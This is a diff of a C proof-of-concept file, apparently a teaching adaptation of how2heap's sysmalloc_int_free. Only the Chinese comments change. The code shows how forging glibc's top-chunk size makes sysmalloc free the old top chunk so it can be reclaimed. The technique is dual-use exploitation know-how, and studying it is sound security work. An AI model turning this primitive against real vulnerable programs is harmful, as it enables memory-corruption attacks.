@@ -8,10 +8,11 @@
 #include <unistd.h>
 
 /*
- * glibc 2.23～2.43 / x86-64：让 sysmalloc 间接释放旧 top。
+ * 本文件面向 glibc 2.23～2.43 / x86-64，展示如何让 sysmalloc 间接释放旧 top。
  *
- * 这份 PoC 源于 how2heap 的 sysmalloc_int_free 思路，改成中文逐步说明。
- * 它直接改 top.size 来模拟题目中的 heap overflow/OOB。
+ * 思路借鉴自 how2heap 的 sysmalloc_int_free，这里改写成带完整中文步骤说明的
+ * 版本。为了让流程可控，PoC 直接改写 top.size，用它模拟题目里常见的
+ * heap overflow / 越界写场景。
  */
 
 #define SIZE_SZ            (sizeof(size_t))
@@ -19,10 +20,10 @@
 #define MALLOC_ALIGNMENT   0x10UL
 #define ALIGN_DOWN(value)  ((value) & ~(MALLOC_ALIGNMENT - 1))
 
-/* sysmalloc 在旧 top 尾部留下两份 header，作为阻止跨区域合并的 fencepost。 */
+/* sysmalloc 会在旧 top 尾部留下两份 chunk header，充当阻止跨区域合并的 fencepost。 */
 #define FENCEPOST_BYTES    (2 * CHUNK_HEADER_SIZE)
 
-/* 希望 sysmalloc 送入 _int_free 的物理 chunk 大小。 */
+/* 这是我们希望 sysmalloc 最终交给 _int_free 处理的物理 chunk 大小。 */
 #define FREED_CHUNK_SIZE   0x150UL
 #define FREED_REQUEST      (FREED_CHUNK_SIZE - CHUNK_HEADER_SIZE)
 
@@ -50,16 +51,18 @@ int main(void)
     assert((FREED_CHUNK_SIZE & (MALLOC_ALIGNMENT - 1)) == 0);
 
     /*
-     * malloc(0x10) 对应物理 size=0x20。用户区后一个 size_t 就是新 top.size，
-     * 因此 probe[3]（以 size_t 为单位）可读到它。这里只是教学探测手段。
+     * malloc(0x10) 对应的物理 size 是 0x20。用户区之后紧跟的一个 size_t 正是
+     * 当前 top.size，所以 probe[3]（以 size_t 为单位数）就能读到它。这只是
+     * 教学用的探测手段，帮助我们确认当前 top 的真实大小。
      */
     probe = malloc(0x10);
     assert(probe != NULL);
     first_top_size = ((size_t *)probe)[3];
 
     /*
-     * 消耗 top，目标是让下一块 top 的真实末端落在 page 边界，并使其低位大小
-     * 可以缩成 0x170：0x20 fencepost + 0x150 freed chunk。
+     * 接下来消耗掉一部分 top，目标是让下一块 top 的真实末端恰好落在页面
+     * 边界上，并让它的低位大小能被缩成 0x170：即 0x20 的 fencepost 加上
+     * 0x150 待释放的 chunk。
      */
     padding_request = first_top_size
                     - CHUNK_HEADER_SIZE
@@ -72,14 +75,14 @@ int main(void)
     padding = malloc(padding_request);
     assert(padding != NULL);
 
-    /* padding 后紧邻 top：末尾考虑对齐后的一个 size_t 即 top.size。 */
+    /* padding 之后紧接着就是 top，其末尾考虑对齐后的一个 size_t 就是 top.size。 */
     top_size_field = (size_t *)(padding + padding_request
                                - SIZE_SZ + MALLOC_ALIGNMENT);
     first_top_size = *top_size_field;
 
     /*
-     * 漏洞点：只保留当前 top.size 在页面内的低位。
-     * size 本身带 PREV_INUSE 位，因此这里通常得到 0x181，而物理大小为 0x180。
+     * 漏洞点：这里只保留当前 top.size 在页面内的低位部分。
+     * size 字段本身带 PREV_INUSE 位，因此通常会得到 0x181，对应的物理大小是 0x180。
      */
     forged_top_size = first_top_size & page_mask;
     *top_size_field = forged_top_size;
@@ -88,13 +91,13 @@ int main(void)
     assert(expected_freed_size == FREED_CHUNK_SIZE);
 
     /*
-     * 请求超过伪 top 的余量，迫使 _int_malloc 进入 sysmalloc。
-     * 新内存区域位于更高地址；旧 top 扣掉 fencepost 后被 _int_free。
+     * 发起一个超过伪造后 top 剩余空间的请求，逼迫 _int_malloc 进入 sysmalloc。
+     * 新的内存区域会分配在更高地址；旧 top 扣掉 fencepost 之后就会被 _int_free 释放。
      */
     high_allocation = malloc(FREED_CHUNK_SIZE + 0x10);
     assert(high_allocation != NULL);
 
-    /* 再申请 0x140，应从刚被释放的 0x150 旧 top chunk 返回低地址。 */
+    /* 再申请 0x140，理应从刚被释放的 0x150 旧 top chunk 那里拿回一个低地址。 */
     reclaimed = malloc(FREED_REQUEST);
     assert(reclaimed != NULL);
     assert(reclaimed < high_allocation);
